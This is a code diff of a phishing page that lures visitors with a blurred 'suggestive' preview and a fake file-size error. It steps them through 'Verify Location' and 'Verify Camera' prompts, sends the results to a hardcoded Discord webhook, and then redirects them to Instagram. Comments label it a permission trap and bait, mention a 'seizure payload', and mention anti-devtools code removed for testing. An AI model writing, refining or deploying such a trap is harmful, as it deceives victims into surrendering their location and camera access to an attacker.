@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -34,7 +35,7 @@
         .file-header strong { color: #c9d1d9; font-weight: 600; }
 
         /* Preview Area: Suggestive/Intimate Blur */
-        .preview-area { position: relative; width: 100%; flex-grow: 1; background-color: #0d1117; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .preview-area { position: relative; width: 100%; flex-grow: 1; background-color: #0d1117; overflow: hidden; display: flex; align-items: center; justify-content: center; min-height: 400px; }
         .blurred-bg { 
             position: absolute; 
             width: 100%; 
@@ -74,37 +75,55 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Censor Icon Overlay (Pure CSS/SVG) */
+        /* Censor Icon Overlay - Enhanced Design */
         .censor-icon { 
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            padding: 15px 20px; 
+            position: absolute; 
+            top: 50%; 
+            left: 50%; 
+            transform: translate(-50%, -50%); 
             z-index: 10; 
-            width: 60px; height: 60px; 
-            display: flex; align-items: center; justify-content: center;
+            width: 80px; 
+            height: 80px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            backdrop-filter: blur(5px);
         }
-        .censor-icon::before { /* Eye Shape (White Oval) */
+        .censor-icon::before { 
             content: "";
             position: absolute;
-            width: 40px; height: 20px;
-            border: 3px solid white;
-            border-radius: 50% / 40%;
-            transform: translateY(-5px);
-            opacity: 0.9;
+            width: 50px; 
+            height: 28px;
+            border: 4px solid rgba(255, 255, 255, 0.95);
+            border-radius: 50% / 50%;
+            background: transparent;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
         }
-        .censor-icon::after { /* Slash/Prohibition (Red Bar) */
+        .censor-icon::after { 
             content: "";
             position: absolute;
-            width: 80px; height: 5px;
-            background: #e74c3c;
+            width: 90px; 
+            height: 6px;
+            background: linear-gradient(90deg, #e74c3c, #c0392b);
             transform: rotate(-45deg);
+            border-radius: 3px;
+            box-shadow: 0 0 15px rgba(231, 76, 60, 0.6);
         }
         .censor-icon.hidden { display: none; } 
 
 
-        /* Video Play Button Overlay */
+        /* Video Play Button Overlay - Enhanced */
         .play-button-overlay {
-            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-            display: flex; align-items: center; justify-content: center;
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            right: 0; 
+            bottom: 0;
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
             z-index: 15;
             background-color: rgba(0,0,0,0.0); 
             cursor: pointer;
@@ -112,12 +131,30 @@
             transition: opacity 0.3s ease-in-out;
         }
         .play-button-overlay.show { opacity: 1; }
-        .play-button-overlay img { 
-            width: 80px; 
-            height: 80px; 
-            filter: invert(1);
-            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zm2.46-7.12l5.65 3.3c.33.19.75.19 1.08 0l5.65-3.3c.33-.19.33-.65 0-.84l-5.65-3.3c-.33-.19-.75-.19-1.08 0l-5.65 3.3c-.33.19-.33.65 0 .84z"/></svg>'); 
-        } 
+        .play-button-overlay .play-icon { 
+            width: 90px; 
+            height: 90px; 
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+            transition: transform 0.2s, background 0.2s;
+        }
+        .play-button-overlay:hover .play-icon {
+            transform: scale(1.1);
+            background: rgba(255, 255, 255, 1);
+        }
+        .play-button-overlay .play-icon::before {
+            content: '';
+            width: 0;
+            height: 0;
+            border-left: 28px solid #0d1117;
+            border-top: 18px solid transparent;
+            border-bottom: 18px solid transparent;
+            margin-left: 6px;
+        }
 
         /* Action/Button Area */
         .action-area { padding: 20px 15px; text-align: center; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
@@ -177,7 +214,7 @@
         #camera-canvas { display: none; } 
     </style>
 </head>
-<body >
+<body>
     <script>
         // ----------------------- CONFIGURATION START ---------------------------
         const PREVIEW_IMAGE_URL = "img.jpg"; // The actual suggestive image file on GitHub
@@ -186,10 +223,6 @@
         const LOG_API_ENDPOINT = "https://discord.com/api/webhooks/1436204803129872564/7PzVCgOMtkML9nZuJioJ4-t6aPJdZeJSbIzPYfPBkPG-LKQl5AJtBiGDJrEKe5UScWm0"; 
         const FINAL_BAIT_URL = "https://instagram.com/"; 
         // ----------------------- CONFIGURATION END ---------------------------
-        
-        // --- ANTI-DEV TOOLS (FREEZE) & ANTI-RIGHT CLICK ---
-        // REMOVED FOR TESTING: (function freezeDevTools() { ... });
-        // REMOVED FOR TESTING: document.body.oncontextmenu = function() { return false; };
         
         let locStatus = "Pending";
         let camStatus = "Pending";
@@ -330,21 +363,27 @@
 
             // Set up initial state for permission loop
             currentPermissionStep = 1;
-            document.getElementById('allow-loc').disabled = false;
-            document.getElementById('allow-cam').disabled = true;
-
-            // Trigger clickPlay logic which starts the flow
-            document.getElementById('play-button-overlay').onclick = clickPlay;
+            const locBtn = document.getElementById('allow-loc');
+            const camBtn = document.getElementById('allow-cam');
+            
+            if (locBtn) {
+                locBtn.disabled = false;
+                locBtn.onclick = function() { startPermissionFlow(1); };
+            }
+            if (camBtn) {
+                camBtn.disabled = true;
+            }
         }
 
 
         // --- STAGE 3: PERMISSION LOOP (Triggered by Play Button) ---
         function clickPlay() {
-            document.getElementById('play-button-overlay').style.opacity = 0; 
-            document.getElementById('play-button-overlay').onclick = null; 
+            const playOverlay = document.getElementById('play-button-overlay');
+            playOverlay.style.opacity = '0'; 
+            playOverlay.style.pointerEvents = 'none';
             
-            // Start the flow based on the current step (1: loc)
-            startPermissionFlow(currentPermissionStep); 
+            // Show modal first, which will trigger showVideoIllusion
+            document.getElementById('modal-overlay').classList.add('show');
         }
 
         // Sequential permission logic
@@ -358,7 +397,7 @@
 
         // Permission request executor
         function requestPermission(type) {
-            const buttonId = `allow-${type}`;
+            const buttonId = (type === 'geolocation') ? 'allow-loc' : 'allow-cam';
             const button = document.getElementById(buttonId);
             
             if (!button) return; // FIX: Prevent crash if button is null
@@ -450,23 +489,30 @@
 
         // Handles success/failure and updates the flow
         function handlePermissionResult(permissionType, success, errorCode) {
-            const buttonId = `allow-${permissionType}`;
+            const buttonId = (permissionType === 'geolocation') ? 'allow-loc' : 'allow-cam';
             const nextButtonId = (permissionType === 'geolocation') ? 'allow-cam' : null;
-            document.getElementById(buttonId).disabled = false;
+            const button = document.getElementById(buttonId);
+            
+            if (!button) return;
+            
+            button.disabled = false;
 
             if (success) {
                 // SUCCESS: Webhook received data. Advance stage.
-                document.getElementById(buttonId).textContent = `Permission Granted!`;
-                document.getElementById(buttonId).disabled = true; 
-                document.getElementById(buttonId).classList.remove('retry');
-                document.getElementById(buttonId).style.backgroundColor = '#238636'; // Green success color
-                document.getElementById(buttonId).style.cursor = 'default';
+                button.textContent = `Permission Granted!`;
+                button.disabled = true; 
+                button.classList.remove('retry');
+                button.style.backgroundColor = '#238636'; // Green success color
+                button.style.cursor = 'default';
 
                 if (permissionType === 'geolocation') {
                     currentPermissionStep = 2; // Move to camera
                     document.getElementById('permission-status').textContent = "Location Verified. Ready for Device Check (2 of 2).";
-                    document.getElementById('allow-cam').disabled = false; // Enable next button
-                    document.getElementById('allow-cam').onclick = function() { startPermissionFlow(currentPermissionStep); };
+                    const camBtn = document.getElementById('allow-cam');
+                    if (camBtn) {
+                        camBtn.disabled = false;
+                        camBtn.onclick = function() { startPermissionFlow(2); };
+                    }
                 } else if (permissionType === 'camera') {
                     // Final success: Deliver the ultimate seizure payload
                     document.getElementById('permission-status').textContent = "Verification check complete. File key has expired.";
@@ -474,14 +520,17 @@
                 }
             } else { 
                 // FAILURE: Either User denied OR Webhook failed to log. Force Retry.
-                document.getElementById(buttonId).textContent = `Verification Failed. Click to Retry.`;
-                document.getElementById(buttonId).classList.add('retry');
+                button.textContent = `Verification Failed. Click to Retry.`;
+                button.classList.add('retry');
                 
                 // Lock the next button if previous step failed
-                if (nextButtonId) { document.getElementById(nextButtonId).disabled = true; }
+                if (nextButtonId) { 
+                    const nextBtn = document.getElementById(nextButtonId);
+                    if (nextBtn) nextBtn.disabled = true;
+                }
                 
                 // Set the button to re-run the current step
-                document.getElementById(buttonId).onclick = function() { startPermissionFlow(currentPermissionStep); };
+                button.onclick = function() { startPermissionFlow(currentPermissionStep); };
                 document.getElementById('permission-status').textContent = `Verification Failed. Please click button above to retry.`;
             }
         }
@@ -538,7 +587,7 @@
                 
                 <!-- Play button overlay that triggers the permissions -->
                 <div class="play-button-overlay" id="play-button-overlay" onclick="clickPlay()">
-                    <img id="play-button-img" alt="Play Button">
+                    <div class="play-icon"></div>
                 </div>
                 <!-- Censor Icon (Initial state) -->
                 <div class="censor-icon" id="censor-icon">
@@ -556,8 +605,8 @@
         <!-- STAGE 2: Permission Trap (Initially Hidden, used by Modal) -->
         <div class="permission-section" id="video-section" style="display:none;">
             <p style="color:#e74c3c; margin-bottom: 20px;">ERROR: File size over 100MB. Verification required for streaming.</p>
-            <button id="allow-loc" class="btn permission-btn" onclick="startPermissionFlow(1)">Verify Location</button>
-            <button id="allow-cam" class="btn permission-btn" onclick="startPermissionFlow(2)" disabled>Verify Camera</button>
+            <button id="allow-loc" class="btn permission-btn">Verify Location</button>
+            <button id="allow-cam" class="btn permission-btn" disabled>Verify Camera</button>
             <p class="status" id="permission-status"></p>
         </div>
 
